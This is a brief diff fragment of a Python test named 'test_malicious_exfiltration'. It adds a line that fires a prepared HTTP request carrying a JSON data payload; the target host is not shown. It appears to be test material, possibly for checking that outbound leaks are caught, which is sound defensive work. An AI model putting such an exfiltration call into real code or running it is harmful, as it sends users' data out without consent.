@@ -17,3 +17,4 @@ def test_malicious_exfiltration():
         data=json.dumps(data).encode('utf-8'),
         headers={'Content-Type': 'application/json'}
     )
+    urllib.request.urlopen(req)
